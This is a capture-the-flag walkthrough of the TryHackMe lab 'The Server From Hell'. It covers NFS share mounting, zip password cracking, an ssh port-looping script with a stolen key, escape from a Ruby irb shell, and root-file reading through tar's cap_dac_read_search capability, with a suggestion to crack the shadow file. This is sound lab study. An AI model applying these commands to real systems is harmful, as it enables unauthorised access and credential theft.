![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/ServerfromHell.jpeg?raw=true)
# TryHackMe : The Server From Hell
-----------------------------------
-----------------------------------

## According to THM room instruction:
### Start at port 1337 and enumerate your way. Good luck.

### That means we have to scan port 1337 first, aiming to get some hint.

## 1.

### So, we scanned with nmap:
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/1.nmap.result.port1337.png?raw=true)

### The banner has a line:
"_**Legend says he's hiding in the first 100 ports**_"

## 2.

### So, we will scan 1st 100 ports:
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/2.nmap_1st_100_ports.png?raw=true)

### Here, we can see 12345, in every port (from 1 to 100)
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/2.nmap_1st_100_ports_grep.png?raw=true)

### We can see a nice face got revealed (i.e. we are doing things right, this thing was made intensional)

## 3.

### Then, We will scan port 12345
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/3.nmap_port_12345.png?raw=true)

### Service is probably netbus which is open.
### I did a bit research on netbus on wiki :
### https://en.wikipedia.org/wiki/NetBus
### It was written that:
"_**The server can be controlled by typing human understandable commands over a raw TCP connection. It is more difficult than using the client application yet allows one to administrate computers with NetBus from operating environments other than Windows, or when original client is not available. Features (such as screen capture) require an application with ability of accepting binary data, such as netcat. Most of more common protocols (like the Internet Relay Chat protocol, POP3 SMTP, HTTP) can also be used over a raw connections in a similar way.**_"

### So we will now try netcat to see what gonna happen:
```
$ nc <ip> 12345
```
#### We got this.
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/4.nc_12345.png?raw=true)

## 4.

### We got a hint that NFS is misconguired.
### NFS, SMB or AFS(apple filing protocol) all are NAS(Network Attached Storage)

### After googling, I found this: 

### https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/

### Here, I came to how to exploit misconfigured NFS.
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/5.showmount_usage.png?raw=true)

## 5.

### So now lets mount it on any other location (Preferrably on /temp directory)

![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/mounting_nfs.png?raw=true)

## 6.

### Now we got a zip file which is encrypted.
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/locked_zip.png?raw=true)

### So, now we have to crack it:
### I actually did the cracking portion with both john and fcrackzip
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/john_did.png?raw=true)
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/fcrackzip_worked.png?raw=true)

### So, now we got the 'pass' for the zip file.
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/got_1st_flag.png?raw=true)

### Voilà, got the 1st flag!!

## 7.

### We also got a hint.txt ----> 2500-4500
### It will most probably be port numbers through which we can enter, probably ssh!?
#### Believing that ssh is running,let us a port scanner to check ssh is running or not, if it is running, then we will login via those rsa key that we got previously, else we have to use nmap.
&nbsp;
```
#!/usr/bin/bash

for port in {2500..4500}
do
        ssh -i id_rsa hades@10.10.251.32 -p $port
done
```
We got:
![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/ssh_port_entry.png?raw=true)

### We can see that on port 3333, ssh was open...

### Now we can see that we got a shell, but it is not bash or any other normal shell. After a quick Google search, I came to know this is a rubi shell.
### To get bash shell:
```
irb(main):001:0> system("/bin/bash")
```
### Now we can see the "_user.txt_" file
### Got the 2nd Flag as well!!

## 8.

### Now the last one.

### HINT: getcap
### ---> Some how we will need getcap
```
hades@hell:~$ getcap
usage: getcap [-v] [-r] [-h] <filename> [<filename> ...]

        displays the capabilities on the queried file(s).
```
&nbsp;
```
hades@hell:~$ getcap -r / 2> /dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```
### Now we will use tar to escalate out priv.
```
hades@hell:/tmp$ tar -cvf root.tar /root
tar: Removing leading `/' from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile
hades@hell:/tmp$ ls
root.tar
systemd-private-7d7e1c6aa7cd4669922912bede788256-systemd-resolved.service-ABOZv5
systemd-private-7d7e1c6aa7cd4669922912bede788256-systemd-timesyncd.service-Yfurff
hades@hell:/tmp$ tar -xvf root.tar 
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile
```
### Now within "_root/_", root.txt is present
### We could have also performed the same thing with shadow file just like root/
### We then should have taken the root password from shadow file by just using cat command.
### Then just copy the root hash and crack it with john.
### Though this method will take another extra step to escalate.
------------------------------------------------------
